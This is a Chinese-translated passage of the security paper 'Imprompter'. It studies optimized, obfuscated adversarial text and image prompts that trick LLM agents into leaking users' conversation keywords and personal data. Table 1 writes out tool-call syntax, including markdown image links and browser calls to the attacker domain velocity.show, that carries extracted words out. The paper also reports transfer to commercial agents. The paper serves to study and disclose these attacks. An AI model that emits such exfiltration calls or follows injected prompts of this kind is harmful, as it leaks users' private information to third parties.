$\mathcal{C}^{\prime}$.INSERT($\tilde{x_{1:n}},\mathcal{L}_{joint}(\tilde{x_{1:n}},\mathcal{D}_{tmp},\lambda)$)19:     结束循环20:     $x_{1:n}\leftarrow\mathcal{C}^{\prime}$.GETMIN()21:     $\mathcal{C}\leftarrow\mathcal{C}^{\prime}$22: 直到 $T$ 次 $\triangleright$ 可能提前停止23: 返回 $\mathcal{C}$

### 4.2\. 可视化对抗样本

由于图像提示易受基于梯度的对抗训练影响，能够在连续空间中优化，因此可视化对抗样本的优化在技术上更为简便（Goodfellow等人，[2014](https://arxiv.org/html/2410.14923v2#bib.bib9)）。此外，图像本质上是模糊的，因为人类无法判断图像对模型的影响。

设$c$表示对话历史，$q$表示当前回合的文本提示，$v$表示要优化的对抗图像，$y$表示目标。单个目标的损失为$\mathcal{L}(v)=-\log P(y|[c;q],x)$。我们创建了$D_{img}=\left\{(c^{(j)},y^{(j)})\right\}^{|\mathcal{D}_{img}|}$，这是一个类似于$D_{text}$的数据集。我们还创建了一个数据集$\mathcal{D}_{q}$，其中包含当前回合对话的文本提示$q$。由于用户可能并不总是提问与图像相关的问题，因此$D_{q}$包含了一个由GPT-4生成的相关问题的大集合和从Alpaca数据集（Taori等， [2023](https://arxiv.org/html/2410.14923v2#bib.bib47)）选出的无关问题。相关问题和无关问题的抽取概率分别为85%和15%。抽取出的$q^{(j)}$随后与对话历史数据一起用于训练。最终的损失为：

| (4) |  | $\mathcal{L}(v)=\frac{1}{&#124;\mathcal{D}_{img}&#124;}\sum_{j}^{&#124;\mathcal{D}_{img}&#124;}-% \log P(y^{(j)}&#124;[c^{(j)};q^{(j)}],v).$ |  |
| --- | --- | --- | --- |

$v$处于一个连续空间，梯度优化方法可以直接应用于最小化式([4](https://arxiv.org/html/2410.14923v2#S4.E4 "In 4.2\. Visual Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"))。我们在实现中采用了Adam优化器（Kingma和Ba，[2014](https://arxiv.org/html/2410.14923v2#bib.bib20)），以加速和获得更好的结果。注意，$v$需要保持在图像表示的有效范围内。$v$中的所有元素都被约束在$[0,1)$范围内。为了满足图像验证约束，我们强制裁剪$v$中的超出范围的值。这种简单直接的方法很有帮助，因为图像数据的优化搜索空间非常大。

## 5\. 评估

我们的实验评估回答了以下关于攻击性能的研究问题：

1.  (1)

    我们的算法可以实现哪些类型的攻击目标？我们展示了两种具有挑战性的攻击目标——信息泄露和个人身份信息泄露，适用于生产级LLM代理，包括Mistral LeChat、ChatGLM和基于Llama3.1-70B的自定义代理。

1.  (2)

    我们的攻击在本地开源模型上的表现如何？我们的攻击正确地调用目标工具的频率超过80%，并且在信息泄露和个人身份信息泄露的设置中，在四个不同的模型（3个文本LLM和1个视觉LLM）中，外泄精度约为80%，涵盖了各种工具调用语法。

1.  (3)

    这些对抗样本在基于这些开源模型的商业LLM代理产品中表现如何（如果有的话）？我们的攻击在转移到Mistral LeChat和ChatGLM时，表现与本地测试相当。在信息泄露和个人身份信息泄露设置中，我们分别达到了高达70%和80%的外泄精度。

#### 攻击目标。

攻击者希望违反用户数据和与代理连接的资源的机密性和完整性。他们将通过迫使代理误用工具来实现这一目标。正如[2.2节](https://arxiv.org/html/2410.14923v2#S2.SS2 "2.2\. 从LLM到代理 ‣ 2\. 背景 ‣ Imprompter: 欺骗LLM代理进行不当工具使用")中讨论的那样，代理可能使用几种类型的工具，这些工具可以帮助代理预订酒店、执行代码、读取和发送电子邮件、操作日历等。我们调查了现实世界中现有的代理，并确定大多数代理通常具有与 URL 交互的工具。因此，为了展示最通用的结果，我们决定创建误用 URL 访问工具的对抗样本。代理的另一个共同点是用户与其进行对话，通常涉及私人信息（Mireshghallah 等， [2024](https://arxiv.org/html/2410.14923v2#bib.bib33)）。基于这一观察，我们创建了两个攻击目标：（1）信息泄露：对抗样本迫使 LLM 代理分析用户的敏感对话，提取出重要的、不间断和非填充的单词，然后通过访问嵌入这些单词路径中的特定 URL，将该信息泄露给攻击者；（2）PII 泄露：对抗样本迫使 LLM 代理使用 Web 访问工具提取 PII 以及一些来自对话的高级上下文信息。请注意，在任何情况下，我们都不期望攻击能够泄露所有信息或 PII，但将其中一部分暴露给攻击者已是一个警示信号。我们观察到，这些目标比那些肆意预订酒店或删除数据的攻击更具挑战性，原因如下：

+   •

    该攻击是动态的，依赖于分析用户的对话。每个用户的对话中将包含不同类型的个人身份信息（PII）和敏感信息。对抗样本必须学会从对话中提取相关信息。

+   •

    攻击必须生成一个完全合格、语法正确的 URL，该 URL 包含从用户对话中提取的信息，并以 URL 路径的形式进行格式化。这比生成一个固定的、与用户对话无关的工具使用命令要困难得多。

上述原因也解释了为什么我们的混淆对抗样本在性质上与其他基于优化的 LLM 攻击（如越狱攻击）有本质区别。

表1. 我们在评估中使用的每个 LLM 代理的目标调用语法。 \mintinline[]text¡Any¿ 表示对此没有要求，可以是任意字符。 \mintinline[]text¡payload¿ 表示从对话中提取的单词。 \mintinline[]textvelocity.show 是攻击者指定的域名。

| LLM 代理 | 工具 | 目标调用语法 |
| --- | --- | --- |
| LeChat | Markdown 图片 | \mintinline[breaklines]markdown![¡Any¿](https://velocity.show/¡payload¿) |
| ChatGLM |
| ChatGLM | 浏览器 | \mintinline[breaklines]pythonsimple_browser(velocity.show/¡payload¿) |
| 定制 Llama 代理 | 浏览器 | \mintinline[breaklines,escapeinside=##]xml¡function#=browse#¿”addr”:”velocity.show/#¡payload¿#”¡/function¿ |

#### 目标 LLM 和代理的选择。

我们的攻击设置需要目标 LLM 代理具备以下特性： (1) 开放权重的 LLM，属于与实际产品相同的家族； (2) 一种通用的 Web 访问工具，例如 URL 获取器或 Markdown 图片渲染支持； (3) LLM 必须能够适应我们的 GPU 资源（间歇性访问 3 个 NVIDIA A100 80G 和 2 个 NVIDIA A6000）。以下商业代理符合这些标准：Mistral 的 LeChat 和 ChatGLM。我们不知道这些代理使用的具体模型的权重，但可以合理推测它们与开放权重版本差别不大——Mistral-Nemo-0714 (12B) (Team, [2024](https://arxiv.org/html/2410.14923v2#bib.bib50)) 和 GLM-4-9B (GLM 等, [2024](https://arxiv.org/html/2410.14923v2#bib.bib8))。我们还实验了 Llama-3.1-70B，因为它是目前最好的开放权重模型之一 (Fourrier 等, [2024](https://arxiv.org/html/2410.14923v2#bib.bib6))。虽然基于该模型的代理（meta.ai）存在，但它不支持任何通用的 URL 访问工具⁶⁶6运行时环境会移除任何生成的 URL。然而，我们认为展示该大型开放权重模型的结果也很重要，因此我们使用 llama-stack-apps 框架⁷⁷7https://github.com/meta-llama/llama-stack-apps 构建了一个定制代理，该代理可以访问通用 URL 获取器。这三个代理都是文本专用的。

我们还展示了文本-图像 LLM 代理的结果。不幸的是，我们没有找到符合上述所有标准的商业代理。因此，我们对使用 PaliGemma-3B 模型进行的代理进行了本地实验，这是 Google 最新的视觉 LLM（Beyer 等, [2024](https://arxiv.org/html/2410.14923v2#bib.bib4)）。

表 [1](https://arxiv.org/html/2410.14923v2#S5.T1 "表 1 ‣ 攻击目标 ‣ 5. 评估 ‣ Imprompter: 诱使 LLM 代理错误使用工具") 展示了对上述所有模型和代理进行攻击时工具调用的语法。\mintinline[breaklines]textvelocity.show 是我们在本文中使用的攻击者指定的域名。它故意选择为不规则且不太像 URL 的形式。为了确保 URL 有效且能被 LLM 代理正确解析，我们要求 <payload> 中提取的术语通过 $/$ 分隔以形成路径（如图 [1](https://arxiv.org/html/2410.14923v2#S1.F1 "图 1 ‣ 1. 引言 ‣ Imprompter: 诱使 LLM 代理错误使用工具") 所示），或者通过 $+$ 来形成查询（并在前面加上 ?q=）。

### 5.1 信息外泄攻击

本次攻击中的对抗示例分析用户的对话，挑选出非停顿词和非填充词，将其编码为有效的URL，然后使智能体使用Web访问工具将提取的单词外泄到攻击者的服务器。我们在Mistral-Nemo-0714、GLM-4-9B和Llama3.1-70B上构建了该攻击，使用之前概述的算法。接着，我们测试了攻击的可转移性，目标是LeChat和ChatGLM。我们注意到，对于Llama没有可转移性测试，因为我们直接在Llama基础上构建了一个定制的智能体。

#### 训练数据集构建。

在本案例中，我们优化的训练数据集($\mathcal{D}_{text}$)必须捕捉到人与智能体之间真实对话中非停顿词和非填充词的概念。它还必须捕捉到提取传递对话信息的单词的概念，即提取的单词应当是显著的。

我们使用ShareGPT对话数据集来获取对话示例⁸⁸8[https://huggingface.co/datasets/anon8231489123/ShareGPT_Vicuna_unfiltered](https://huggingface.co/datasets/anon8231489123/ShareGPT_Vicuna_unfiltered)。该数据集包含了2022年底和2023年初，人与ChatGPT 3.5之间的近53k条对话。我们从数据集中抽取了前100条对话，排除了明显低质量的对话，如“Hello!”、“Hi I’m GPT”。

然后，我们使用被攻击的LLM生成要提取的关键字。我们通过以下提示对LLM进行提示：“从上面的对话中提取几个关键词，使用逗号分隔并且只输出这些内容。\n\输出：\n”。我们观察到这是一个有效的选择，原因如下：(1) 生产级LLM，如我们攻击的这些，已经展现了在文本理解和总结方面的强大能力（GLM等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib8)；Dubey等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib5)；Jin等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib18)）；(2) 使用模型自身的内部理解来教导对抗性示例识别对话中的显著单词更加高效。最后，我们根据表[1](https://arxiv.org/html/2410.14923v2#S5.T1 "Table 1 ‣ Attack Objective. ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")构建了这些数据集项的正确工具调用。

视觉模型PaliGemma-3B的训练数据集构建遵循上述相同的程序，不同的是，我们没有用它来从对话中提取显著单词，而是使用Llama3.1-70B生成的单词，因为PaliGemma由于其相对较小的模型规模（3B），能力有限。

表 2. 信息泄露攻击。不同攻击设置下的本地评估结果。ID 是对抗性提示的标识符。$\downarrow$ 表示从初始提示到对抗性提示的变化。请注意，提取率和精确度仅在语法正确的情况下计算，并且当语法正确率差异显著时，各行之间的比较是无效的。

{tblr} colspec=Q[c,0.6cm]Q[c,0.6cm]Q[c]Q[c,4.7cm]Q[c,4.7cm]Q[c]Q[c]Q[c]Q[c]Q[c], rowspec=Q[m], hline1,Z = 1pt, belowsep = 0pt, abovesep = 1.5pt, \SetCell[c=2]c 攻击

设置 & ID 初始提示 对抗性提示 PPL 语法

正确率 % 提取率

精确度 % 提取率

GPT % 时间

h

\SetCell[r=4,c=2]c Mistral

Nemo

MD 图片 \SetCell[r=2]c T1 \SetCell[r=2]l,m ![[无标题图片]](img/00141fd498ef792cb0ccc2b6c8ff2ab0.png) \SetCell[r=2]c,m ![[无标题图片]](img/fcd2710009508b3cb0fee8d07128d676.png) \SetCell[r=2]c 348

$\downarrow$

5413 \SetCell[r=2]c 73.0

$\downarrow$

90.0 \SetCell[r=2]c 87.2 \SetCell[r=2]c 83.7 \SetCell[r=2]c 27

\SetCell[r=2]c T2 \SetCell[r=2]l,m ![[无标题图片]](img/87dab1f7f67046c44e96462e897de24f.png) \SetCell[r=2]c,m ![[无标题图片]](img/866845240c760d7a7950cc46ae64a704.png) \SetCell[r=2]c 254

$\downarrow$

4713 \SetCell[r=2]c 64.3

$\downarrow$

89.7 \SetCell[r=2]c 86.0 \SetCell[r=2]c 76.7 \SetCell[r=2]c 23

\SetCell[r=2]r 手动提示 \SetCell[r=2]c N1 \SetCell[r=2,c=2]l,m,9.6cm ![[无标题图片]](img/2ae3f2782d1c05e4ab5ee979b4b0664e.png) \SetCell[r=2]c,m \SetCell[r=2]c 260 \SetCell[r=2]c 86 \SetCell[r=2]c 86.1 \SetCell[r=2]c 38.3 \SetCell[r=2]c -

\SetCell[r=2,c=2]c GLM-4

浏览器

（查询） \SetCell[r=2]c T3 \SetCell[r=2]l,m ![[无标题图片]](img/1846adcb0e26193007797e9eeef1baae.png) \SetCell[r=2]c,m ![[无标题图片]](img/c936c363f17fcbcb161c2edac0efc608.png) \SetCell[r=2]c 267

$\downarrow$

39211 \SetCell[r=2]c 5.7

$\downarrow$

92.4 \SetCell[r=2]c 85.6 \SetCell[r=2]c 91.5 \SetCell[r=2]c 15

\SetCell[r=2]r 手动提示 \SetCell[r=2]c N2 \SetCell[r=2,c=2]l,m,9.6cm ![[无标题图片]](img/fa3d699061965347cf63b290252f0653.png) \SetCell[r=2]c,m \SetCell[r=2]c 281 \SetCell[r=2]c 32.3 \SetCell[r=2]c 6.0 \SetCell[r=2]c 0 \SetCell[r=2]c -

\SetCell[r=2,c=2]c GLM-4

浏览器

（路径） \SetCell[r=2]c T4 \SetCell[r=2]l,m ![[无标题图片]](img/9b8bceb4d1ca5b8946411e2212df6258.png) \SetCell[r=2]c,m ![[无标题图片]](img/ef6010cf830f32975bbc464d4e5b9e4e.png) \SetCell[r=2]c 332

$\downarrow$

13168 \SetCell[r=2]c 45.6

$\downarrow$

87.0 \SetCell[r=2]c 83.4 \SetCell[r=2]c 73.0 \SetCell[r=2]c 21

\SetCell[r=2]r 手动提示 \SetCell[r=2]c N3 \SetCell[r=2,c=2]l,m,9.6cm ![[无标题图片]](img/a32241dad5db0962286d6e00d2af2f21.png) \SetCell[r=2]c,m \SetCell[r=2]c 281 \SetCell[r=2]c 63.6 \SetCell[r=2]c 48.3 \SetCell[r=2]c 40.0 \SetCell[r=2]c -

\SetCell[r=4,c=2]c GLM-4

MD 图片 \SetCell[r=2]c T5 \SetCell[r=2]l,m ![[无标题图片]](img/21240878a714c90e69415a320fc8505b.png) \SetCell[r=2]c,m ![[无标题图片]](img/2919701d5ae03c8f5573e5552657f8db.png) \SetCell[r=2]c 98

$\downarrow$

8009 \SetCell[r=2]c 0

$\downarrow$

95.3 \SetCell[r=2]c 77.5 \SetCell[r=2]c 84.0 \SetCell[r=2]c 21

\SetCell[r=2]c T6 \SetCell[r=2]l,m ![[无标题图片]](img/d73330624bd955683cbeae0ed75f14b3.png) \SetCell[r=2]c,m ![[无标题图片]](img/56d7b0271db87cda8ab0cba719187eb7.png) \SetCell[r=2]c 127

$\downarrow$

11264 \SetCell[r=2]c 0

$\downarrow$

84.0 \SetCell[r=2]c 85.6 \SetCell[r=2]c 74 \SetCell[r=2]c 16

\SetCell[r=2]r 手动提示 \SetCell[r=2]c N4 \SetCell[r=2,c=2]l,m,9.6cm ![[无标题图片]](img/cbaf4f7788cfc1bdfba2b3bcf3b494eb.png) \SetCell[r=2]c,m \SetCell[r=2]c 117 \SetCell[r=2]c 0 \SetCell[r=2]c 0 \SetCell[r=2]c 0 \SetCell[r=2]c -

\SetCell[r=4,c=2]c Llama3.1

浏览器 \SetCell[r=2]c T7 \SetCell[r=2]l,m ![[无标题图片]](img/ff8e5e111f1271e0ac6880ee518b7e64.png) \SetCell[r=2]c,m ![[无标题图片]](img/944f89730cbada4e04ae45f244c3e9e1.png) \SetCell[r=2]c 394

$\downarrow$

23323 \SetCell[r=2]c 72.7

$\downarrow$

79.0 \SetCell[r=2]c 90.0 \SetCell[r=2]c 75.0 \SetCell[r=2]c 27

\SetCell[r=2]c T8 \SetCell[r=2]l,m ![[无标题图片]](img/f2b7f8a7660a2c0fd3869e1599d590d4.png) \SetCell[r=2]c,m ![[无标题图片]](img/20403fd07fa45c80b898c79dee975ec0.png) \SetCell[r=2]c 31068

$\downarrow$

56927 \SetCell[r=2]c 2.7

$\downarrow$

81.6 \SetCell[r=2]c 89.4 \SetCell[r=2]c 78.3 \SetCell[r=2]c 6.1

\SetCell[r=2]r 手动提示 \SetCell[r=2]c N5 \SetCell[r=2,c=2]l,m,9.6cm ![[无标题图片]](img/75401ebec71ebaca9e34bb1baaa2129f.png) \SetCell[r=2]c,m \SetCell[r=2]c 616 \SetCell[r=2]c 72.3 \SetCell[r=2]c 92 \SetCell[r=2]c 70.7 \SetCell[r=2]c -

#### 指标。

我们从 ShareGPT 数据集中获取了 100 个不同的对话（最后 100 个）作为验证集。我们针对这 100 个对话中的每一个进行了 3 次推理试验，并使用以下按优先级排列的指标评估了结果。

1.  (1)

    语法正确性——即 LLM 生成的内容是否包含工具调用所需的确切语法子字符串。通过对应的正则表达式来判断每个工具调用语法，并反映攻击是否成功调用了目标工具。因此，这一点至关重要。我们报告了在 100 个对话中，敌对样本导致生成具有正确工具调用语法的次数。

1.  (2)

    提示困惑度（PPL）— 衡量一个大语言模型（LLM）如何预测对抗样本的能力。它广泛地作为文本不自然程度的指标（Shi等，[2022](https://arxiv.org/html/2410.14923v2#bib.bib44); Martinc等，[2021](https://arxiv.org/html/2410.14923v2#bib.bib29)）。我们将其作为我们对抗文本混淆级别的参考。只要提示困惑度显著大于其自然语言对应文本的困惑度，我们就认为该提示是经过混淆的。我们使用我们环境中适配的最大LLM进行困惑度计算，即Llama3.1 70B。具体到这个模型，常规自然语言文本的困惑度通常低于10（Dubey等，[2024](https://arxiv.org/html/2410.14923v2#bib.bib5)）。

1.  (3)

    词汇提取精度 — 当语法正确时，提取出的单词中出现在对话中的单词比例。它以确定性的方式衡量提取内容与原始对话单词的契合度。我们对对话内容和提取的单词应用Porter词干提取算法（Porter，[2001](https://arxiv.org/html/2410.14923v2#bib.bib38)），以消除同一单词的不同变体（例如，run和ran），并在计算前去除任何停用词和填充词。由于Porter词干提取器并不总是成功地将同义词归为同一词根词汇，例如，irritation和irritated将分别被归为irrat和irratat，因此此统计数据推断了实际性能的下限。我们报告验证数据集中对话的最终聚合比例。

1.  (4)

    词语提取 GPT 分数——当语法正确时，这个分数衡量 GPT-4-o 是否认为有效载荷从对话中捕获了任何显著信息。（当语法不正确时，答案总是 False。）我们考虑到语义相似但语法不同的词语（例如，融资 vs. 银行）从对话中提取时会降低精度分数，因此引入了这一指标。我们报告 GPT 在100次对话中返回 True 的次数。请注意，尽管 GPT-4-o 被广泛作为语义任务的评判工具，并且表现良好（Zheng 等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib58)），我们发现它由于不确定性而不可靠，并将其视为除上述精度分数之外的次要参考。提示在附录 [A.2](https://arxiv.org/html/2410.14923v2#A1.SS2 "A.2\. Prompt List ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") 中提供。

请注意，所有报告的数字都是通过三次推理试验的平均值来反映我们对抗样本的平均性能。我们还强调，词语提取精度仅在工具调用成功时计算（即，当语法正确时）。

#### 本地文本大语言模型的结果。

我们在获得的训练数据集上执行了优化方法，采用了各种优化参数组合，即初始提示、词汇掩码、语法正确性损失权重$\lambda$、提案数量$p$和子集大小$s$（$N$和$k$分别固定为10和256）。对于较小的模型Mistral Nemo和GLM-4，我们的攻击适合在一台NVIDIA A6000 48GB上进行。至于Llama3.1 70B，我们的攻击需要三台NVIDIA A100 80GB。每个设置下的优化大多数情况下都在24小时内完成。然后，我们在验证集上测试了获得的对抗性示例。我们展示了两种优化设置以及在每种设置中获得的最佳表现提示（从$N$=10中挑选），针对五种不同的攻击目标（即目标模型和工具），并列出了在表[5.1](https://arxiv.org/html/2410.14923v2#S5.SS1.SSS0.Px1 "Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")中的评估结果。为简便起见，我们将除初始提示外的其他优化参数列于附录[A.1](https://arxiv.org/html/2410.14923v2#A1.SS1 "A.1\. Optimization Parameters ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")。每个目标展示两种设置旨在展示攻击成功的多样性和非孤立性。请注意，我们在自然语言指令中手动插入了!作为初始化，以增加总标记数并使其偏离纯粹的自然语言（参见第[4.1](https://arxiv.org/html/2410.14923v2#S4.SS1.SSS0.Px3 "Obfuscation. ‣ 4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")节）。

我们的对抗性示例有效地从本地文本LLM中提取信息。我们可以看到，每个呈现的对抗性示例平均实现了至少80%的语法正确率，最佳的示例在相同攻击设置下通常高于或接近90%，同时保持较高的困惑度分数，并对人类进行混淆。这样的成功率表明我们的攻击在本地模型上的可靠性。此外，单词提取精度和单词提取GPT评分始终保持在约80%左右。这表明该攻击在提取显著信息方面非常有效。

我们的优化方法有效且具有良好的泛化能力。可以观察到，在三种不同目标工具调用语法（表[1](https://arxiv.org/html/2410.14923v2#S5.T1 "表1 ‣ 攻击目标 ‣ 5\. 评估 ‣ Imprompter：诱导LLM代理不当使用工具")）下，我们的优化方法在三种不同规模的生产级文本LLM（9B、12B和70B参数）中始终有效——我们观察到与自然语言指令和初始提示相比，语法成功率和困惑度 consistently 有显著提高。虽然我们无法穷举所有可能的组合，但这些结果表明我们的攻击方法能够推广到其他模型和其他目标工具调用文本（尤其是之前提到的语法固定、挑战较小的那些）。

#### 真实产品上的结果。

为了展示我们攻击在真实世界LLM代理中的有效性，我们将本地评估中获得的最佳表现对抗性文本提示（即提示T1和T5）转移到相应的LLM代理产品，Mistral LeChat Nemo和ChatGLM。在这两种情况下，我们的目标都是Markdown图像渲染工具。

我们使用Selenium浏览器自动化工具包与Mistral LeChat和ChatGLM的网页界面进行交互，并自动收集代理的响应。这两个产品在我们的验证数据集中每天限制约35次对话。因此，像我们在本地LLM评估中做的那样进行三次推理是不现实的。我们仅为每个示例进行了单次推理，并基于这次单次尝试报告了表[3](https://arxiv.org/html/2410.14923v2#S5.T3 "表3 ‣ 真实产品结果 ‣ 本地文本LLM结果 ‣ 指标 ‣ 训练数据集构建 ‣ 5.1\. 信息外泄攻击 ‣ 5\. 评估 ‣ Imprompter：诱导LLM代理不当使用工具")中的所有结果。由于验证集中的2次对话被标记为对这些真实产品有害，我们将其移除，因此我们总共测试了98次对话。

表3\. 对真实产品的信息外泄攻击。表[5.1](https://arxiv.org/html/2410.14923v2#S5.SS1.SSS0.Px1 "训练数据集构建 ‣ 5.1\. 信息外泄攻击 ‣ 5\. 评估 ‣ Imprompter：诱导LLM代理不当使用工具")中的最佳表现（在相应攻击设置下）的对抗性提示与表[5.2](https://arxiv.org/html/2410.14923v2#S5.SS2.SSS0.Px1 "数据集构建 ‣ 5.2\. 个人信息外泄攻击 ‣ 本地视觉LLM结果 ‣ 真实产品结果 ‣ 本地文本LLM结果 ‣ 指标 ‣ 训练数据集构建 ‣ 5.1\. 信息外泄攻击 ‣ 5\. 评估 ‣ Imprompter：诱导LLM代理不当使用工具")中的另一个对抗性提示相比，在LeChat和ChatGLM上与手动提示的评估结果。

代理ID 语法正确率 % 提取精度 % 提取GPT %

我们的文本对抗示例能够迁移到黑盒实际世界LLM代理。我们可以看到这两个对抗示例T1和T5在这两个实际世界的LLM代理中依然有效（T10将在下一节讨论）。T1的语法正确率略有下降，而T5的语法正确率有所上升。我们看到两个提示在信息提取效果上略有下降，但并不显著。我们认为这是因为我们训练数据集中的代理响应纯粹是文本，而这些现代代理经常用富有语法的内容作答，比如代码块、在线搜索结果块，甚至是AI生成的图表，这些在训练中并未出现。需要注意的是，在这两个产品中，我们优化后的对抗提示的语法正确率高于手动提示（N1和N4），这表明优化过程是有效的。

#### 本地视觉LLM的结果。

我们在6个基础图像上运行图像优化方法。有关基础图像的详细信息及其选择方式，请参见附录[A.3](https://arxiv.org/html/2410.14923v2#A1.SS3 "A.3\. Base Image for Image Attack ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")。所有这些图像都已预处理为224x224像素。我们在表格[4](https://arxiv.org/html/2410.14923v2#S5.T4 "Table 4 ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")中展示了评估结果，并在图形[3](https://arxiv.org/html/2410.14923v2#S5.F3 "Figure 3 ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")中显示了对抗图像。提示的困惑度不适用于图像。为了完整性，我们报告了结构相似性（SSIM）（Wang et al., [2004](https://arxiv.org/html/2410.14923v2#bib.bib51)）来反映对抗图像与初始图像之间的相对失真。

我们的攻击在本地视觉LLM上也能有效地工作。一般来说，所有六张对抗图像都显示了有希望的结果。语法正确性与本地文本模型上的文本对抗图像相当，范围从80%到90%。关键词提取的得分稍低。考虑到目标PaliGemma模型由于其较小的模型规模（3B参数）在语义理解能力上的限制，这一点并不令人惊讶。

我们还观察到，由于背景模糊以及甜甜圈上添加的点状糖霜，特别难以察觉V4中添加的噪声（图[2(d)](https://arxiv.org/html/2410.14923v2#S5.F2.sf4 "图3 ‣ 本地视觉LLM的结果 ‣ 真实产品的结果 ‣ 本地文本LLM的结果 ‣ 指标 ‣ 训练数据集构建 ‣ 5.1. 信息外泄攻击 ‣ 5. 评估 ‣ Imprompter: 诱使LLM代理使用不当工具")）。这表明攻击者可以仔细选择优化的基础图像，以减少用户在必要时识别出添加噪声的机会。然而，如图[4.2](https://arxiv.org/html/2410.14923v2#S4.SS2 "4.2. 视觉对抗样本 ‣ 4. 对抗样本优化 ‣ Imprompter: 诱使LLM代理使用不当工具")中所述，提升SSIM并不是我们攻击的目标，因为在我们的背景下，图像本质上是经过模糊处理的。通过对损失函数应用正则化项，可能会提高相似度得分，但可能会以较低的攻击性能和更长的优化时间为代价（Fu等人，[2023](https://arxiv.org/html/2410.14923v2#bib.bib7)）。

![参见标题](img/00ba8f7392a1867d344086a9b6c555e4.png)

((a)) V1

![参见标题](img/ce74d9e45c6f4de9e28513af2f866dbf.png)

((b)) V2

![参见标题](img/afad5a60af862dec411be323598ee56b.png)

((c)) V3

![参见标题](img/635944354bb130bd6893574d762e2228.png)

((d)) V4

![参见标题](img/bac97b309eab249b41b036b1cb6799b8.png)

((e)) V5

![参见标题](img/61d091bf3bfe44ee35368a01016f0d00.png)

((f)) V6

图3. 优化后的对抗图像。

表4. 信息外泄攻击。PaliGemma上各种视觉对抗样本的本地评估结果。

| # | SSIM | 语法正确性 % | 提取准确性 % | 提取GPT % |
| --- | --- | --- | --- | --- |
| V1 | 0.665 | 87.8 | 84.3 | 78.4 |
| V2 | 0.780 | 83.6 | 73.0 | 62.6 |
| V3 | 0.640 | 82.6 | 80.7 | 61.2 |
| V4 | 0.785 | 83.0 | 80.9 | 65.8 |
| V5 | 0.783 | 82.0 | 86.3 | 69.8 |
| V6 | 0.583 | 83.4 | 79.1 | 63.0 |

### 5.2. PII外泄攻击

在此攻击中的对抗性示例，不像之前的攻击那样挑选出显著的非停用词和非填充词，而是应挑选出与个人身份信息相关的词汇以及一些对话的高层次上下文，并执行相同的泄露操作。我们所说的个人身份信息（PII）包括姓名、联系方式（包括电话、电子邮件、地址等）、政府身份证明（如护照号码）以及其他能帮助识别个人的信息。我们定义的上下文是指能够暗示对话主题的信息（例如，用户的意图和用户所涉及的事务）。我们在 Mistral-Nemo-0714 和 GLM4 上构建了这一攻击，并分别测试了其在 Mistral LeChat 和 ChatGLM 上的可转移性。

#### 数据集构建。

PII提取的训练数据集是基于另一个名为 WildChat 的真实世界人类-LLM对话数据集创建的，WildChat 数据集收集于 2024 年（Zhao 等， [2024](https://arxiv.org/html/2410.14923v2#bib.bib57)）。先前的研究表明，人们在与 LLM 代理的对话中提供私人信息，并提供了对 WildChat 中对话中私人信息类型的分类注释（Mireshghallah 等， [2024](https://arxiv.org/html/2410.14923v2#bib.bib33)）。基于此，我们手动从 WildChat 中找到所有属于“工作、签证和其他申请”类别的 49 段对话，这些对话包含有效的个人身份信息数据（并用假信息替换了删除的个人身份信息）。然后，我们手动识别每个对话的真实个人身份信息以及 GPT-4-o 提取的草稿上方的附加上下文。我们从中随机抽取了 24 个构建了训练数据集，剩余的 25 个作为验证数据集。

